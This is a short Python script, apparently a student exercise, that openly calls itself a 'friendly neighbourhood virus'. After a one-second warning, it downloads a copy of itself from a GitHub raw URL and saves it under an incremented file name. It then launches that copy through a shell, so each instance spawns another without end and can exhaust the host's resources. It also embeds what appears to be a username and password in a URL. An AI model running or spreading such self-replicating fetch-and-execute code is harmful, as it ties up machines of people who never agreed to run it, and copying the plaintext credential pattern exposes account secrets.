import time
import os
import inspect
import subprocess

import urllib.request

print("Greetings, this is your friendly neighbourhood virus.")
print("To stop me, close this terminal before I print the 'proceeding' message.")
time.sleep(1)
print("proceeding")

#get filename and path of current instance
filename = inspect.getframeinfo(inspect.currentframe()).filename
path = os.path.dirname(os.path.abspath(filename))

lastindexof=str(filename).rfind('\\')
filename_only=str(filename)[lastindexof+1:]

#Download newest version

#https://github.com/castawaywars/M122_AP18c_Thema_Anderfuhren_Schuhmacher.git
#lb1_virus_patience_reloaded.py
#https://github.com/castawaywars/M122_AP18c_Thema_Anderfuhren_Schuhmacher/blob/b2b131f0d197bba3aebfa68e1fb0812fa0004cde/lb1_virus_patience_reloaded.py

#I hope that's the right path. The other three haven't been tested.
download_path="https://github.com/castawaywars/M122_AP18c_Thema_Anderfuhren_Schuhmacher/blob/Anderfuhren/lb1_virus_patience_reloaded.py"
download_raw="https://raw.githubusercontent.com/castawaywars/M122_AP18c_Thema_Anderfuhren_Schuhmacher/Anderfuhren/lb1_virus_patience_reloaded.py"
download_raw_auth="https://castawaywars@Rafisa2ProjektCW@raw.github.com/castawaywars/M122_AP18c_Thema_Anderfuhren_Schuhmacher/blob/Anderfuhren/lb1_virus_patience_reloaded.py"

targetfilename=None
filename_length=len(filename_only)
if(filename_length!=30):
	count=int(filename_only[27:-3])
	count=count+1
	targetfilename=filename_only[:27]+str(count)+".py"
else:
	targetfilename=filename_only[:-3]+"1.py"


local_filename, headers = urllib.request.urlretrieve(download_raw, filename=targetfilename)

#print(local_filename)
#print(headers)




#TODO: Store new file in the same directory under a new name
#open(path+"test.py").write(req.content)


#prepare filename to be callable
filestring=str(targetfilename)
filestring='"'+filestring+'"'
#run new instance
subprocess.call("start python "+filestring, shell=True)

urllib.request.urlcleanup()

print("end of instance")
